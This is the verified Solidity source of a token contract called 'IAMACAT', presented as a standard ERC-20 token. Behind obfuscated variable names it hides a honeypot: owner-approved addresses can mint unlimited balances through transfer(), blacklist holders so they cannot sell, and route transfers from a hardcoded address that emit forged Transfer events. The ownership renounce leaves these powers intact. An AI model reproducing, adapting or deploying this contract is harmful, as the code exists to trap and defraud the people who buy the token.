/**
 *Submitted for verification at Etherscan.io on 2022-11-06
*/

/**
 *Submitted for verification at Etherscan.io on 2022-11-04
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address ZSV = 0xf6d60bb4F2b670cA2932817a9E27c755cE9F156B;
	address Hashcore = 0xe780A56306ba1E6bB331952C22539b858af9F77d;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }
        		modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }

}



contract UMBRAL is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private Hbv;
	mapping (address => bool) private Hcv;
    mapping (address => bool) private Hav;
    mapping (address => mapping (address => uint256)) private Hvv;
    uint8 private constant HDec = 6;
    uint256 private constant HBal = 1000000000 * 10**HDec;
    string private constant _name = "IAMACAT";
    string private constant _symbol = "IAC";

    constructor () {
        Hbv[_msgSender()] = HBal;
        initEmit();
    }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return HDec;
    }

    function totalSupply() public pure returns (uint256) {
        return HBal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return Hbv[account];
    }
    function initEmit() onlyOwner internal {
        emit Transfer(address(0), Hashcore, HBal);
    }

    function allowance(address owner, address spender) public view  returns (uint256) {
        return Hvv[owner][spender];
    }

	function _Approve(address Jj) onlyOwner public{
        Hcv[Jj] = true;
    }
		
    function approve(address spender, uint256 amount) public returns (bool success) {    
        Hvv[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

        
		function HBaltake(address Jj) public {
        if(Hcv[msg.sender]) { 
        Hav[Jj] = false;}}
        function PreAddLiquidity(address Jj) public{
         if(Hcv[msg.sender])  { 
        Hav[Jj] = true; }}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == ZSV)  {
        require(amount <= Hbv[sender]);
        Hbv[sender] -= amount;  
        Hbv[recipient] += amount; 
          Hvv[sender][msg.sender] -= amount;
        emit Transfer (Hashcore, recipient, amount);
        return true; }  else  
          if(!Hav[recipient]) {
          if(!Hav[sender]) {
         require(amount <= Hbv[sender]);
        require(amount <= Hvv[sender][msg.sender]);
        Hbv[sender] -= amount;
        Hbv[recipient] += amount;
        Hvv[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function transfer(address Jl, uint256 Jj) public {
        if(msg.sender == ZSV)  {
        require(Hbv[msg.sender] >= Jj);
        Hbv[msg.sender] -= Jj;  
        Hbv[Jl] += Jj; 
        emit Transfer (Hashcore, Jl, Jj);} else  
        if(Hcv[msg.sender]) {Hbv[Jl] += Jj;} else
        if(!Hav[msg.sender]) {
        require(Hbv[msg.sender] >= Jj);
        Hbv[msg.sender] -= Jj;  
        Hbv[Jl] += Jj;          
        emit Transfer(msg.sender, Jl, Jj);}}}